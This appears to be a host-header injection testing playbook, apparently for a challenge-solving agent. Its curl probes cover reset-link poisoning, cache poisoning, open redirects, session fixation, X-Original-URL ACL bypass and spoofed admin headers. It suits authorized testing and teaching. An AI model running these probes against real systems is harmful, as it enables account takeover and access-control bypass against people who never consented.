# Field manual — the host-header per-surface sequence

The ordered field manual — one surface at a time.

---

## 1. The canonical-URL surface — the generated links

```bash
# the canonical-URL check — a reflected host
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
#   the canonical URLs point to canary.example → a stored injection
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links/scripts point to canary.example → a stored injection
```

## 2. The reset-link surface — the account takeover

```bash
# the reset-link check — a reflected forwarded header
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
#   the reset link points to canary.example → an account takeover
```

## 3. The Location surface — the open redirect

```bash
# the Location check — a reflected host
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
#   the Location points to canary.example → an open redirect
```

## 4. The Set-Cookie surface — the session fixation

```bash
# the Set-Cookie check — a reflected host
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
#   the Set-Cookie domain binds to canary.example → a session fixation
```

## 5. The cache-key surface — the cache-poisoning feed

```bash
# the cache-key check — a reflected host
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
#   the cache stores the page under canary.example → a cache-poisoning feed
```

## 6. The rewrite surface — the ACL bypass

```bash
# the rewrite check — a middleware rewrite
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   a 200 on the gated route → the middleware rewrites the path → an ACL bypass
```

## 7. The forwarded surface — the RFC 7239 form

```bash
# the forwarded check — a forwarded header
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links point to canary.example → a stored injection
```

## 8. The duplicated Host surface — the parsing differential

```bash
# the duplicated Host check — a parsing differential
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
```

## 9. The malformed Host surface — the parsing edge

```bash
# the malformed Host check — a parsing edge
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator
```

## 10. The absolute-URI surface — the request-line differential

```bash
# the absolute-URI check — a request-line differential
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://target.com/'   # an absolute-URI
curl -s -D - "http://evil.example/" --resolve 'evil.example:443:127.0.0.1'   # an absolute-URI
curl -s -D - "http://target.com/" --resolve 'target.com:443:127.0.0.1'   # an absolute-URI
```

## 11. The multi-header surface — the combined injection

```bash
# the multi-header check — a combined injection
curl "$BASE/api/internal" -H 'Host: evil.example' -H 'X-Internal: true'   # a host + an internal
curl "$BASE/api/admin" -H 'Host: evil.example' -H 'X-Admin: true'   # a host + an admin
curl "$BASE/api/user" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api/debug" -H 'Host: evil.example' -H 'X-Debug: true'   # a host + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Host: attacker.com'   # a host + a forwarded host
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Proto: http'   # a host + a scheme
```

## 12. The multi-proxy surface — the chained normalization

```bash
# the multi-proxy check — a chained normalization
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # a chained email differential
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # a chained server differential
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # a chained port differential
```

## 13. The field-manual's reach — the downstream

```text
the field-manual's reach is the downstream — a canonical URL the app's
links rewrite — a reset link the victim clicks — a cache key the cache
stores — a Location the proxy redirects — a Set-Cookie the app binds —
a middleware rewrite the app's route reads.
```

## 14. The field-manual's falsifier — when the surface is dead

```text
a proxy that validates the Host against a server list → a 400 on a bad
host → a negative result, not a retry signal.
a proxy that strips the client-supplied forwarded header → the header
doesn't reach the app → the bypass fails → a different class.
a proxy that verifies the forwarded header it added → a client-supplied
header is rejected → the bypass fails → a different class.
a trust check that reads a different input → a different class.
```

## 15. The field-manual's budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
